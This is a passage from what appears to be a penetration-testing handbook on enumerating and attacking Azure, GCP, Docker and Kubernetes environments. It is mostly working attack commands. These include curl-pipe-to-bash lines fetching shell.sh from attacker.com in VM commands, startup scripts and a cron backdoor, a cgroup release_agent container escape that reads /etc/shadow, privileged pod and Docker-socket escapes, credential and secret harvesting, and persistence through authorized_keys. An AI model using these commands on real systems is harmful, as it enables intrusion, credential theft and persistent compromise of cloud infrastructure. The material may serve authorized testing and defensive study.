az keyvault secret list --vault-name <vault_name>

# Get secret value
az keyvault secret show --vault-name <vault_name> --name <secret_name>

# List keys
az keyvault key list --vault-name <vault_name>

# List certificates
az keyvault certificate list --vault-name <vault_name>

# PowerShell
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName <vault_name>
Get-AzKeyVaultSecret -VaultName <vault_name> -Name <secret_name> -AsPlainText
```

**Azure SQL Database Enumeration**

```bash
# List SQL servers
az sql server list

# List databases
az sql db list --server <server_name> --resource-group <rg_name>

# Show database
az sql db show --server <server_name> --resource-group <rg_name> --name <db_name>

# List firewall rules
az sql server firewall-rule list --server <server_name> --resource-group <rg_name>

# Check if public access allowed
az sql server show --name <server_name> --resource-group <rg_name> --query publicNetworkAccess

# PowerShell
Get-AzSqlServer
Get-AzSqlDatabase
```

**Web App Enumeration**

```bash
# List web apps
az webapp list

# Web app details
az webapp show --name <app_name> --resource-group <rg_name>

# Configuration settings
az webapp config appsettings list --name <app_name> --resource-group <rg_name>

# Connection strings (may contain credentials)
az webapp config connection-string list --name <app_name> --resource-group <rg_name>

# Deployment credentials
az webapp deployment list-publishing-credentials --name <app_name> --resource-group <rg_name>

# Download source code (if SCM access available)
curl https://<app_name>.scm.azurewebsites.net/api/zip/site/wwwroot -o source.zip --user '<username>:<password>'

# PowerShell
Get-AzWebApp Get-AzWebApp -ResourceGroupName <rg_name> -Name <app_name>
````

### Azure Automation Tools

**ROADTools - Azure AD Enumeration**
```bash
# Install ROADTools
pip install roadrecon

# Authenticate and gather data
roadrecon auth -u user@company.com -p password
roadrecon gather

# Generate HTML report
roadrecon gui

# Database querying
roadrecon plugin policies  # Conditional access policies
roadrecon plugin dumplocal  # Dump to JSON files

# [Inference] ROADTools creates local database with AAD objects for offline analysis
````

**MicroBurst - Azure Security Assessment**

```powershell
# Install MicroBurst
Install-Module -Name MicroBurst -Force

# Import module
Import-Module MicroBurst

# Enumerate all resources
Invoke-EnumerateAzureSubDomains -Base company -Verbose

# Export subscription data
Get-AzDomainInfo

# Find public blobs
Invoke-EnumerateAzureBlobs -Base company

# Extract RunAs credentials from Automation Accounts
Get-AzurePasswords

# Enumerate virtual machines
Get-AzureVMDisk

# Get web app details
Get-AzWebAppDetails
```

**AzureHound - Azure AD Attack Paths**

```bash
# Install AzureHound
# Part of BloodHound suite

# Collect Azure AD data
azurehound -u user@company.com -p password list --tenant <tenant_id> -o output.json

# Alternative authentication methods
azurehound -r refreshtoken.txt list --tenant <tenant_id> -o output.json

# Import into BloodHound for visualization
# Shows privilege escalation paths, group memberships, role assignments
```

**Azure AD Internals Toolkit**

```powershell
# Install AADInternals
Install-Module AADInternals -Force

# Import module
Import-Module AADInternals

# Get tenant information
Get-AADIntTenantID -Domain company.com
Get-AADIntLoginInformation -UserName user@company.com

# Enumerate users (requires credentials)
$cred = Get-Credential
Get-AADIntUsers -Credentials $cred

# Get access token
$token = Get-AADIntAccessTokenForAADGraph -Credentials $cred

# Extract information using token
Get-AADIntUsers -AccessToken $token
Get-AADIntServicePrincipals -AccessToken $token

# [Inference] AADInternals provides low-level Azure AD access and attack primitives
```

**Stormspotter - Azure Red Team Tool**

```bash
# Install Stormspotter
git clone https://github.com/Azure/Stormspotter.git
cd Stormspotter
pip3 install -r requirements.txt

# Backend setup (Docker)
docker-compose up

# Collect Azure data
python3 stormspotter/main.py --cli --debug

# Web interface for visualization
# Access at http://localhost:8080

# [Unverified] Shows resource relationships and attack paths in Azure environment
```

### Azure Privilege Escalation

**Common Escalation Paths:**

```bash
# 1. Reset user password (if permitted)
az ad user update --id target@company.com --password NewPassword123!

# 2. Add user to privileged group
az ad group member add --group "Global Administrators" --member-id <user_object_id>

# 3. Modify application credentials
az ad app credential reset --id <app_id>

# 4. Create new service principal with permissions
az ad sp create-for-rbac --name "MaliciousSP" --role Contributor --scopes /subscriptions/<subscription_id>

# 5. Grant role assignment
az role assignment create --assignee <user_or_sp_id> --role Owner --scope /subscriptions/<subscription_id>

# 6. Execute command on VM
az vm run-command invoke --resource-group <rg> --name <vm_name> --command-id RunShellScript --scripts "curl http://attacker.com/shell.sh | bash"

# 7. Access Key Vault secrets with managed identity
TOKEN=$(curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' | jq -r '.access_token')
curl -H "Authorization: Bearer $TOKEN" "https://<vault_name>.vault.azure.net/secrets/<secret_name>?api-version=7.0"

# 8. Modify web app deployment
az webapp deployment source config-zip --resource-group <rg> --name <app_name> --src malicious.zip
```

## GCP Enumeration

Google Cloud Platform (GCP) uses service accounts for authentication, Cloud IAM for permissions, and various storage/compute services. Enumeration focuses on project discovery, service account exploitation, and resource access.

### GCP Credential Discovery

**Credential Locations**

```bash
# Application Default Credentials
cat ~/.config/gcloud/application_default_credentials.json
cat ~/.config/gcloud/credentials.db

# Service account keys (JSON format)
find / -name "*gcp*.json" 2>/dev/null
find / -name "*service-account*.json" 2>/dev/null
find / -name "*serviceaccount*.json" 2>/dev/null

# Legacy gcloud config
cat ~/.config/gcloud/configurations/config_default

# Environment variables
env | grep GOOGLE
env | grep GCP
printenv | grep -i gcloud

# Docker/Kubernetes
docker inspect <container_id> | grep -i google
kubectl get secrets --all-namespaces
```

**Service Account Key Format:**

```json
{
  "type": "service_account",
  "project_id": "my-project",
  "private_key_id": "key-id",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "service-account@my-project.iam.gserviceaccount.com",
  "client_id": "1234567890",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/..."
}
```

**Authenticating with Credentials**

```bash
# gcloud CLI with service account key
gcloud auth activate-service-account --key-file=service-account-key.json

# Verify authentication
gcloud auth list

# Set project
gcloud config set project my-project-id

# Check current configuration
gcloud config list

# Application Default Credentials
export GOOGLE_APPLICATION_CREDENTIALS="/path/to/service-account-key.json"

# Verify access
gcloud projects list
```

### GCP Compute Instance Metadata

**GCP Metadata Service**

```bash
# GCP metadata endpoint (requires specific headers)

# Get access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Output includes:
# - access_token
# - expires_in
# - token_type

# Instance metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"

# Specific metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/hostname" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/zone" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/name" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/id" -H "Metadata-Flavor: Google"

# Project metadata
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id" -H "Metadata-Flavor: Google"

# Service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" -H "Metadata-Flavor: Google"

# Service account scopes
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" -H "Metadata-Flavor: Google"

# SSH keys (if present)
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys" -H "Metadata-Flavor: Google"

# Custom metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/" -H "Metadata-Flavor: Google"

# Startup script (may contain sensitive commands)
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" -H "Metadata-Flavor: Google"
```

**Using Metadata Access Token**

```bash
# Get token
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')

# List storage buckets
curl -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=my-project"

# List compute instances
curl -H "Authorization: Bearer $TOKEN" "https://compute.googleapis.com/compute/v1/projects/my-project/zones/us-central1-a/instances"

# Access Cloud Storage
curl -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/bucket-name/o"
```

### GCP IAM Enumeration

**Project Discovery**

```bash
# List accessible projects
gcloud projects list

# Current project
gcloud config get-value project

# Project details
gcloud projects describe my-project-id

# Service accounts in project
gcloud iam service-accounts list

# Service account details
gcloud iam service-accounts describe service-account@my-project.iam.gserviceaccount.com

# Service account keys
gcloud iam service-accounts keys list --iam-account=service-account@my-project.iam.gserviceaccount.com
```

**Permission Enumeration**

```bash
# Test permissions on project
gcloud projects get-iam-policy my-project-id

# Test specific resource permissions
gcloud compute instances get-iam-policy instance-name --zone=us-central1-a

# Check your own permissions (testable)
gcloud projects get-iam-policy my-project-id --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:user:current-user@example.com"

# List roles
gcloud iam roles list

# Describe specific role
gcloud iam roles describe roles/viewer

# Custom roles
gcloud iam roles list --project=my-project-id
```

**User and Service Account Enumeration**

```bash
# Current identity
gcloud auth list

# Service accounts
gcloud iam service-accounts list --project=my-project-id

# IAM policy for project (all bindings)
gcloud projects get-iam-policy my-project-id

# Parse for specific roles
gcloud projects get-iam-policy my-project-id --flatten="bindings[].members" --format="table(bindings.role, bindings.members)" --filter="bindings.role:roles/owner"

# Organization policies (if access available)
gcloud resource-manager org-policies list --project=my-project-id
```

### GCP Storage Enumeration

**Cloud Storage Buckets**

```bash
# List buckets
gcloud storage buckets list
# Or legacy command:
gsutil ls

# List objects in bucket
gcloud storage ls gs://bucket-name/
gsutil ls gs://bucket-name/

# Bucket details
gcloud storage buckets describe gs://bucket-name/

# Bucket IAM policy
gcloud storage buckets get-iam-policy gs://bucket-name/

# Check public access
gsutil iam get gs://bucket-name/

# Download file
gcloud storage cp gs://bucket-name/file.txt ./
gsutil cp gs://bucket-name/file.txt ./

# Download entire bucket
gcloud storage cp -r gs://bucket-name/ ./local-directory/
gsutil -m cp -r gs://bucket-name/ ./local-directory/

# Test unauthenticated access
curl https://storage.googleapis.com/bucket-name/file.txt
```

**Bucket Name Bruteforcing**

```bash
# Common naming patterns
company-name
company-name-backups
company-name-prod
company-name-dev
companyname-bucket
my-project-id-backups

# GCPBucketBrute
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
python3 gcpbucketbrute.py -k wordlist.txt

# Manual testing
cat bucket_names.txt | while read bucket; do
    echo -n "$bucket: "
    curl -s -I "https://storage.googleapis.com/$bucket/" | grep "HTTP/"
done

# Check bucket existence (unauthenticated)
curl -I "https://storage.googleapis.com/bucket-name/"
# 200 = exists and public
# 403 = exists but private
# 404 = doesn't exist
```

### GCP Compute Enumeration

**Instance Discovery**

```bash
# List instances (all zones)
gcloud compute instances list

# Instances in specific zone
gcloud compute instances list --zones=us-central1-a

# Instance details
gcloud compute instances describe instance-name --zone=us-central1-a

# Serial port output (may contain sensitive data)
gcloud compute instances get-serial-port-output instance-name --zone=us-central1-a

# List disks
gcloud compute disks list

# Disk details
gcloud compute disks describe disk-name --zone=us-central1-a

# List snapshots
gcloud compute snapshots list

# Snapshot details
gcloud compute snapshots describe snapshot-name

# List images
gcloud compute images list --project=my-project-id

# Firewall rules
gcloud compute firewall-rules list

# Networks and subnets
gcloud compute networks list
gcloud compute networks subnets list
```

**Snapshot Exploitation**

```bash
# Create disk from snapshot
gcloud compute disks create restored-disk --source-snapshot=snapshot-name --zone=us-central1-a

# Attach disk to instance
gcloud compute instances attach-disk instance-name --disk=restored-disk --zone=us-central1-a

# Mount and access (from within instance)
sudo mkdir /mnt/snapshot
sudo mount /dev/sdb1 /mnt/snapshot
ls -la /mnt/snapshot

# Search for sensitive data
find /mnt/snapshot -name "*.json" -o -name "*.key" -o -name "*credential*"
grep -r "private_key" /mnt/snapshot/
```

### GCP Database Enumeration

**Cloud SQL**

```bash
# List SQL instances
gcloud sql instances list

# Instance details
gcloud sql instances describe instance-name

# List databases
gcloud sql databases list --instance=instance-name

# List users
gcloud sql users list --instance=instance-name

# Connection details
gcloud sql instances describe instance-name --format="value(connectionName)"

# Check if public IP assigned
gcloud sql instances describe instance-name --format="value(ipAddresses[0].ipAddress)"

# SSL certificates
gcloud sql ssl-certs list --instance=instance-name
```

**Firestore/Datastore**

```bash
# List Firestore collections (requires appropriate permissions)
# No direct gcloud command; use application code or REST API

# With REST API and token
TOKEN=$(gcloud auth print-access-token)
curl -H "Authorization: Bearer $TOKEN" "https://firestore.googleapis.com/v1/projects/my-project-id/databases/(default)/documents"

# Datastore entities
gcloud datastore indexes list
```

### GCP Secrets Management

**Secret Manager**

```bash
# List secrets
gcloud secrets list

# Secret versions
gcloud secrets versions list secret-name

# Access secret value
gcloud secrets versions access latest --secret=secret-name

# Secret metadata
gcloud secrets describe secret-name

# Batch retrieval
gcloud secrets list --format="value(name)" | while read secret; do
    echo "Secret: $secret"
    gcloud secrets versions access latest --secret="$secret"
    echo "---"
done
```

### GCP Cloud Functions

**Function Enumeration**

```bash
# List functions
gcloud functions list

# Function details
gcloud functions describe function-name --region=us-central1

# Download function source
gcloud functions describe function-name --region=us-central1 --format="value(sourceArchiveUrl)" | xargs curl -o function.zip

# Environment variables
gcloud functions describe function-name --region=us-central1 --format="value(environmentVariables)"

# Invoke function (if permitted)
gcloud functions call function-name --data='{"key":"value"}'

# Function logs (may contain sensitive output)
gcloud functions logs read function-name --region=us-central1 --limit=50
```

### GCP Enumeration Tools

**GCP IAM Privilege Escalation Scanner**

```bash
# Install gcp-iam-privilege-escalation
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
cd GCP-IAM-Privilege-Escalation

# Scan for privilege escalation paths
python3 enumerate_member_permissions.py --project-id my-project-id --service-account service-account@my-project.iam.gserviceaccount.com

# Check specific escalation methods
python3 check_creds.py --service-account service-account@my-project.iam.gserviceaccount.com --project-id my-project-id
```

**ScoutSuite for GCP**

```bash
# Install ScoutSuite
pip install scoutsuite

# Run GCP assessment
scout gcp --user-account
# Or with service account:
scout gcp --service-account service-account-key.json

# Generates HTML report at scoutsuite-report/index.html
# Identifies misconfigurations, public resources, weak IAM policies
```

**gcp_enum - Automated GCP Enumeration**

```bash
# Basic enumeration script
#!/bin/bash

echo "[*] GCP Enumeration Starting"
echo "======================================"

# Identity
echo "[+] Current Identity:"
gcloud auth list

# Projects
echo -e "\n[+] Projects:"
gcloud projects list

# Storage
echo -e "\n[+] Storage Buckets:"
gsutil ls

# Compute
echo -e "\n[+] Compute Instances:"
gcloud compute instances list

# Service Accounts
echo -e "\n[+] Service Accounts:"
gcloud iam service-accounts list

# Cloud Functions
echo -e "\n[+] Cloud Functions:"
gcloud functions list

# SQL Instances
echo -e "\n[+] Cloud SQL:"
gcloud sql instances list

# Secrets
echo -e "\n[+] Secrets:"
gcloud secrets list

echo -e "\n[*] Enumeration Complete"
```

### GCP Privilege Escalation

**Common Escalation Techniques:**

```bash
# 1. Create service account key
gcloud iam service-accounts keys create key.json --iam-account=target-sa@project.iam.gserviceaccount.com

# 2. Add IAM policy binding
gcloud projects add-iam-policy-binding my-project-id --member="serviceAccount:attacker@project.iam.gserviceaccount.com" --role="roles/owner"

# 3. Update Cloud Function with malicious code
gcloud functions deploy function-name --runtime=python39 --trigger-http --entry-point=main --source=./malicious-code/

# 4. Create snapshot of privileged disk
gcloud compute disks snapshot disk-name --snapshot-names=exfil-snapshot --zone=us-central1-a

# 5. Deploy instance with service account
gcloud compute instances create malicious-vm --service-account=privileged-sa@project.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a

# 6. Modify startup script
gcloud compute instances add-metadata instance-name --metadata=startup-script='curl http://attacker.com/shell.sh | bash' --zone=us-central1-a

# 7. Access secrets via metadata service
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
curl -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/my-project/secrets/secret-name/versions/latest:access"
```

## Docker Enumeration

Docker containers provide isolated environments but may expose sensitive information through misconfigurations, mounted volumes, and privileged access. Enumeration focuses on identifying container escape vectors, credential discovery, and host system access.

### Docker Environment Detection

**Identifying Container Environment**

```bash
# Check if running in container
if [ -f /.dockerenv ]; then
    echo "Running in Docker container"
fi

# Check cgroup
cat /proc/1/cgroup | grep -i docker

# Check processes
ps aux | head -n 1

# Hostname (often container ID)
hostname

# Check for docker.sock mount
ls -la /var/run/docker.sock

# Capabilities
capsh --print

# Namespaces
ls -la /proc/self/ns/
```

**Container Runtime Detection**

```bash
# Docker
[ -f /.dockerenv ] && echo "Docker"

# Kubernetes
[ -d /var/run/secrets/kubernetes.io ] && echo "Kubernetes"

# LXC
[ -f /proc/1/environ ] && grep -qa container=lxc /proc/1/environ && echo "LXC"

# Check environment variables
env | grep -i "docker\|kube\|container"
```

### Docker Socket Exploitation

**Docker Socket Access (Critical)**

```bash
# If docker.sock is mounted, you have full Docker API access

# List containers
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Container details
curl --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/json

# List images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

# Create privileged container (container escape)
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "Binds": ["/:/hostfs"],
    "Privileged": true
  }' \
  http://localhost/containers/create

# Start container
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/<container_id>/start

# Execute command in container
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/hostfs/etc/shadow"]}' \
  http://localhost/containers/<container_id>/exec

# With docker CLI (if available and socket accessible)
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs sh
```

### Container Credential Discovery

**Environment Variables**

```bash
# Display all environment variables
env
printenv

# Search for sensitive patterns
env | grep -i "password\|secret\|key\|token\|api"

# Process environment variables
cat /proc/self/environ | tr '\0' '\n'
cat /proc/1/environ | tr '\0' '\n'

# All running processes (if permitted)
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -i "password\|secret"
done
```

**Mounted Volumes and Files**

```bash
# Check mounts
mount
cat /proc/mounts

# Common sensitive mount points
ls -la /root/.ssh/
ls -la /home/*/.ssh/
ls -la /root/.aws/
ls -la /root/.config/gcloud/
ls -la /root/.kube/

# Application config files
find / -name "*.conf" -o -name "*.config" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20

# Database connection strings
grep -r "mysql://\|postgresql://\|mongodb://\|jdbc:" /var/www/ /opt/ /app/ 2>/dev/null

# Docker secrets (Swarm)
ls -la /run/secrets/
cat /run/secrets/*

# Kubernetes secrets (mounted)
ls -la /var/run/secrets/kubernetes.io/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Docker History and Layers**

```bash
# If docker CLI available
docker history <image_name>

# Look for secrets in layers
docker save <image_name> -o image.tar
tar -xf image.tar
# Examine layer contents

# Without docker CLI, examine filesystem
find / -name "*.tar" 2>/dev/null
find / -name "Dockerfile*" 2>/dev/null
cat /proc/self/cgroup
```

### Container Escape Techniques

**Privileged Container Escape**

```bash
# Check if privileged
capsh --print | grep cap_sys_admin

# If cap_sys_admin is present
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enable cgroup notifications
echo 1 > /tmp/cgrp/x/notify_on_release

# Get container path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create escape script
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload (executes on host)
cat > /cmd << EOF
#!/bin/sh
cat /etc/shadow > $host_path/shadow_output
EOF
chmod a+x /cmd

# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Read output
cat /shadow_output
```

**Exploiting Capabilities**

```bash
# Check capabilities
capsh --print
getcap -r / 2>/dev/null

# cap_sys_ptrace - allows process injection
# cap_sys_module - allows kernel module loading
# cap_dac_read_search - bypasses file read permission checks

# Example: cap_dac_read_search abuse
# Can read any file on host if filesystem is accessible
find / -name "shadow" 2>/dev/null
cat /host_mount/etc/shadow
```

**CVE-Based Escapes**

```bash
# runC vulnerability (CVE-2019-5736)
# Allows overwriting host runC binary

# Check runC version (if accessible)
runc --version

# Exploit requires specific conditions and payloads
# [Unverified] Exploit code varies by environment
```

### Docker API Enumeration

**Unauthenticated Docker API**

```bash
# If Docker API exposed on TCP (misconfiguration)
# Default ports: 2375 (unencrypted), 2376 (TLS)

# Check if accessible
curl http://target:2375/version

# List containers
curl http://target:2375/containers/json

# Container details
curl http://target:2375/containers/<container_id>/json

# List images
curl http://target:2375/images/json

# Execute command (create exec instance)
curl -X POST http://target:2375/containers/<container_id>/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["cat", "/etc/passwd"]}'

# Start exec instance
curl -X POST http://target:2375/exec/<exec_id>/start \
  -H "Content-Type: application/json" \
  -d '{"Detach": false, "Tty": false}'
```

**Docker Registry Enumeration**

```bash
# Docker Registry v2 API

# Catalog (list repositories)
curl http://registry:5000/v2/_catalog

# List tags for repository
curl http://registry:5000/v2/<repository>/tags/list

# Download manifest
curl http://registry:5000/v2/<repository>/manifests/<tag>

# Download layer
curl http://registry:5000/v2/<repository>/blobs/<digest> -o layer.tar.gz

# Extract and analyze
tar -xzf layer.tar.gz
```

### Kubernetes-Specific Enumeration

**Service Account Token**

```bash
# Default service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# CA certificate
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Set variables
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
export APISERVER=https://kubernetes.default.svc

# Test API access
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods
```

**Kubernetes API Enumeration**

```bash
# List pods in namespace
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# List all namespaces (if permitted)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# List secrets
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Get secret value
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/<secret_name>

# List services
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/$NAMESPACE/services

# With kubectl (if available)
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true get pods
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true get secrets
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true get secret <secret_name> -o yaml
```

**Kubernetes Privilege Escalation**

```bash
# Create privileged pod (if permitted)
cat <<EOF | kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: priv-container
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Execute in privileged pod
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify=true exec -it priv-pod -- chroot /host bash
```

### Docker Enumeration Tools

**DeepCE - Docker Enumeration**

```bash
# Download and run DeepCE
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh chmod +x deepce.sh ./deepce.sh

# Automated checks for:
# - Container detection
# - Docker socket access
# - Capabilities
# - Mounted filesystems
# - Sensitive files
# - Container escape vulnerabilities
# - Network configuration

# With specific modules
./deepce.sh --no-enumeration # Skip basic enumeration ./deepce.sh --exploit # Attempt exploits
````

**CDK - Container Security Toolkit**
```bash
# Download CDK
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Evaluate environment
./cdk_linux_amd64 evaluate

# Specific checks
./cdk_linux_amd64 evaluate --list  # List available checks

# Run specific exploit
./cdk_linux_amd64 run mount-cgroup  # cgroup escape
./cdk_linux_amd64 run docker-sock-check
./cdk_linux_amd64 run k8s-get-sa-token

# Service scanning
./cdk_linux_amd64 probe 192.168.1.0/24 6443,10250,2379,2380
````

**Amicontained - Container Introspection**

```bash
# Download and run
wget https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
chmod +x amicontained-linux-amd64
./amicontained-linux-amd64

# Output shows:
# - Container runtime
# - Capabilities
# - Seccomp profile
# - AppArmor profile
# - Namespaces
```

**Docker Bench Security**

```bash
# Run Docker Bench (on Docker host)
docker run -it --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security

# Checks CIS Docker Benchmark compliance
# Identifies misconfigurations and security issues
```

### Container Network Enumeration

**Network Discovery from Container**

```bash
# Network interfaces
ip addr
ifconfig

# Routing table
ip route
route -n

# ARP table (discover other hosts)
ip neigh
arp -a

# DNS configuration
cat /etc/resolv.conf

# Scan local network (if nmap available)
nmap -sn 172.17.0.0/24

# Without nmap, ping sweep
for i in {1..254}; do
    (ping -c 1 172.17.0.$i &>/dev/null && echo "172.17.0.$i is up") &
done
wait

# Port scanning without nmap
for port in 22 80 443 3306 5432 6379 8080; do
    timeout 1 bash -c "echo >/dev/tcp/172.17.0.2/$port" 2>/dev/null && echo "Port $port open"
done
```

**Service Discovery**

```bash
# Check for common services in container network
# Docker default network: 172.17.0.0/16
# Kubernetes pod network: varies (10.0.0.0/8, 192.168.0.0/16)

# Database services
nc -zv 172.17.0.1 3306  # MySQL
nc -zv 172.17.0.1 5432  # PostgreSQL
nc -zv 172.17.0.1 6379  # Redis
nc -zv 172.17.0.1 27017 # MongoDB

# Docker API
nc -zv 172.17.0.1 2375  # Unencrypted
nc -zv 172.17.0.1 2376  # TLS

# Kubernetes API
nc -zv 10.0.0.1 6443
nc -zv 10.0.0.1 10250  # Kubelet

# etcd
nc -zv 172.17.0.1 2379
nc -zv 172.17.0.1 2380
```

### Container Configuration Enumeration

**Docker Compose Discovery**

```bash
# Look for docker-compose files
find / -name "docker-compose.yml" -o -name "docker-compose.yaml" 2>/dev/null

# Analyze compose file
cat docker-compose.yml

# Look for:
# - Environment variables with credentials
# - Volume mounts exposing sensitive paths
# - Privileged containers
# - Host network mode
# - Exposed ports
```

**Dockerfile Analysis**

```bash
# Find Dockerfiles
find / -name "Dockerfile*" 2>/dev/null

# Analyze for secrets
cat Dockerfile | grep -i "password\|secret\|key\|token"

# Look for:
# - Hardcoded credentials in ENV or ARG
# - COPY commands with sensitive files
# - Exposed ports
# - RUN commands with wget/curl downloading scripts
```

**Image Layer Analysis**

```bash
# If docker CLI available, examine image layers
docker history --no-trunc <image_name>

# Look for deleted files (may still exist in layers)
docker save <image_name> -o image.tar
tar -xf image.tar

# Each layer is a tar.gz
for layer in */layer.tar; do
    echo "Examining $layer"
    tar -tzf $layer | grep -i "password\|secret\|key"
done

# Extract and search
for layer in */layer.tar; do
    mkdir tmp_layer
    tar -xf $layer -C tmp_layer
    grep -r "password\|secret" tmp_layer/ 2>/dev/null
    rm -rf tmp_layer
done
```

### Container Persistence and Backdoors

**Container Backdoor Techniques**

```bash
# 1. Add SSH key to mounted host filesystem
if [ -d /host/root/.ssh ]; then
    echo "ssh-rsa AAAA... attacker@evil" >> /host/root/.ssh/authorized_keys
fi

# 2. Cron job on host (if /host/etc/cron.d mounted)
echo "* * * * * root curl http://attacker.com/shell.sh | bash" > /host/etc/cron.d/backdoor

# 3. Modified container with persistence
# If docker socket accessible
docker commit <container_id> backdoored-image:latest
docker run -d --restart always backdoored-image:latest

# 4. Kubernetes persistent backdoor
# Create deployment with privileged pod
kubectl create deployment backdoor --image=alpine -- /bin/sh -c "while true; do sleep 3600; done"
```

### Sensitive Data Hunting in Containers

**Automated Secret Discovery**

```bash
# Comprehensive secret search
grep -r -E '(password|passwd|pwd|secret|token|api[_-]?key|private[_-]?key|access[_-]?key).*[:=]' /app /var/www /opt /home /root 2>/dev/null

# Base64 encoded data (potential secrets)
find / -type f -exec grep -H '[A-Za-z0-9+/]\{40,\}' {} \; 2>/dev/null | head -20

# Private keys
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "id_dsa" 2>/dev/null

# Cloud credentials
cat ~/.aws/credentials ~/.azure/credentials ~/.config/gcloud/application_default_credentials.json 2>/dev/null

# Database connection strings
grep -r "mysql://\|postgresql://\|mongodb://\|jdbc:\|Server=.*Database=" /app /var/www /opt 2>/dev/null

# JWT tokens
